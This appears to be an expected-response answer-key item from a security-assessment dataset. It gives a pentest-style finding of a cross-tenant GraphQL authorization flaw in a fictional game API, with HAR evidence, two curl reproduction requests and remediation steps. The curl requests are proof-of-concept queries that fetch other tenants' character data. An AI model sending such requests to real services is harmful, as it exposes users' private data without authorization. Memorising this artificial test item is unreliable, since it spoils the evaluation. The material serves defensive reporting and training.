# Expected Response

## System
- Domain: Gaming / Game Platform
- System: RealmForge Game API
- Example ID: GQL-0082

## Priority Findings

### Finding 1: GraphQL Resolver/Graph Traversal Injection — Cross-Tenant Game Character Data Access (Pattern 5.2)
**Severity:** Critical
**Category:** Injection / Graph Traversal

**Summary:**
Per §5.0 (Pattern 5.2 — resolver/graph traversal injection): The `bulkCharacterLookup` mutation traverses character graph nodes without re-validating authorization at each lookup. An attacker from `tenant-8674` retrieved game character records (`C-2082`, `C-1082`, `C-3082`) belonging to `tenant-780b`. In a gaming platform, this exposes player inventory, achievement data, virtual currency balances, and character progression that constitute valuable virtual assets.

**Evidence from HAR:**
- Request: `POST https://api.realmforge-game-api.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-8674`
- Mutation: `bulkCharacterLookup(ids: ["C-2082", "C-1082", "C-3082"]) { characterId tenantId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-780b"`, `ownerId: "other-user-8674780b"`, `sensitiveField: "CONFIDENTIAL-8674780b"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-8674780b`
- Note: Response field is `getCharacter` — domain object is `Character`/`characterId` (not generic `Resource`).

**Root Cause:** `bulkCharacterLookup` and `getCharacter` resolvers traverse graph nodes without per-node tenantId re-validation.

## Steps to Reproduce

### Step 1 — Bulk character graph traversal (HAR)
```bash
curl -s -X POST https://api.realmforge-game-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-8674" \
  -d '{"query": "mutation { bulkCharacterLookup(ids: [\"C-2082\", \"C-1082\", \"C-3082\"]) { characterId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-8674780b` from `tenant-780b`. **Secure:** FORBIDDEN.

### Step 2 — Single character graph traversal injection
```bash
curl -s -X POST https://api.realmforge-game-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-8674" \
  -d '{"query": "query { getCharacter(id: \"C-2082\") { characterId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Graph traversal accesses victim character without re-validation.

## Remediation
1. Per-character tenantId validation in `bulkCharacterLookup` — reject IDs from other tenants.
2. Resolver tenant guard on `getCharacter`: `WHERE character_id=$id AND tenant_id=$jwt.tenantId`.
3. Re-validate authorization at each graph node in traversal.
4. Redis cache key: `character:{tenantId}:{characterId}`.
